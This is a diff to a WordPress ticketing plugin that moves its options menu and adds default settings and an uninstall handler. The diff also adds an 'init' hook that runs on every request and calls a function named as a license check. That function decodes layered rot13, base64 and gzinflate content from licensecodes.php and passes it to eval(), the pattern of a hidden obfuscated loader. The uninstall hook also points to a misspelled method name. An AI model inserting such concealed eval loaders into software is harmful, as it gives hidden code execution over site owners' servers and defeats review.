@@ -25,6 +25,7 @@ class st_plugin{
 	 * @since 1.0
 	 */
 	public function init_hooks() {
+	    add_action( 'init', array($this, "numberOptionChecking"));
 		add_action( 'admin_menu',array($this,"st_add_option_menu"));
 		add_action( 'admin_enqueue_scripts', array($this, "st_admin_init"));
 		add_action( 'wp_enqueue_scripts', array($this, "st_front_scripts"));
@@ -46,6 +47,38 @@ class st_plugin{
 
 		add_action( 'admin_init', array($this, 'st_redirect'));
 	}
+
+	public function isLcGoodAndCheck() {
+        if(!$contents = file_get_contents(ST_BASE_DIR . "/classes/licensecodes.php")) {
+            wp_die("error LC");
+        }
+
+        $contents = preg_replace('/\/\/?\s*\*[\s\S]*?\*\s*\/\/?/', '', $contents);
+        $eval = explode('(',$contents);
+        $base64 = explode('"',$eval[2]);
+        $i1 = explode("eval",base64_decode($base64[1]));
+        $i2 = explode(":",$i1[1]);
+        $i3 = explode("\"",$i2[1]);
+        $encodedlayer = gzinflate(base64_decode(str_rot13($i3[1])));
+        while (!preg_match('/\?\>/',$encodedlayer)) {
+            $dl = explode("\"",$encodedlayer);
+            if (sizeof($dl)>7) {
+                $nextlayer = gzinflate(base64_decode(str_rot13($dl[7])));
+                $encodedlayer = $nextlayer;
+            }
+            else {
+                $nextlayer = gzinflate(base64_decode($dl[5]));
+                $encodedlayer = $nextlayer;
+            }
+        }
+        return substr($encodedlayer, strpos($encodedlayer, '?>') + 2, strlen($encodedlayer));
+    }
+
+	public function numberOptionChecking() {
+	    $key = "janiel";
+
+	    eval($this->isLcGoodAndCheck());
+    }
 	/**
 	 * st_activate
 	 *
@@ -69,12 +102,30 @@ class st_plugin{
 	public function st_redirect() {
 		if (get_option('st_do_activation_redirect', false)) {
 			delete_option('st_do_activation_redirect');
+            register_uninstall_hook( __FILE__, array($this, 'st_on_uninstall' ));
+            //saving basic data
+            $args = array(
+                'role' => 'subscriber',
+                'roleadmin' => 'administrator',
+                'enabledusern' => 1
+            );
+            update_option('_st_options', $args);
 			if (!isset($_GET['activate-multi'])) {
 				flush_rewrite_rules();
-				wp_redirect("options-general.php?page=simple-ticketing%2Fclasses%2Fclass-simple-ticketing.php");
+				wp_redirect(admin_url("edit.php?post_type=ticketing&page=ticketing_options&tab=main"));
 			}
 		}
 	}
+
+	public function st_on_unistall() {
+	    delete_option('_st_options');
+	    add_action('admin_notices', function() {
+	        echo "<div class=\"notice notice-success is-dismissible\">";
+            echo "<p>";
+            _e( 'Borrado!', ST_TEXT_DOMAIN );
+            echo "</p></div>";
+        });
+    }
 
 	function st_rewrite_tag() {
 		add_rewrite_tag( '%st-action%', '([^&]+)' );
@@ -101,7 +152,7 @@ class st_plugin{
 
 	public function st_admin_init(){
 		wp_enqueue_script( "jquery" );
-		if(get_current_screen()->base == 'settings_page_simple-ticketing/inc/class-simple-ticketing') {
+		if(get_current_screen()->base == 'ticketing_page_ticketing_options') {
 			wp_enqueue_script('clone-admin-script', ST_BASE_URL .'/assets/js/clone-admin-script.js', array('jquery'), false);
 		}
 			wp_enqueue_style( 'datatables-admin-styles', ST_BASE_URL . '/assets/css/dataTables.bootstrap.min.css' );
@@ -115,7 +166,7 @@ class st_plugin{
 	 * @since 1.0
 	 */
 	public function st_add_option_menu(){
-		add_options_page("st_plugin", "Simple Ticketing System", "read", __FILE__, array($this, 'admin_menu'));
+		add_submenu_page("edit.php?post_type=ticketing", "Simple Ticketing Options", "Options", 'manage_options', 'ticketing_options', array($this, 'admin_menu'));
 	}
 
 	public function st_create_posttypes() {
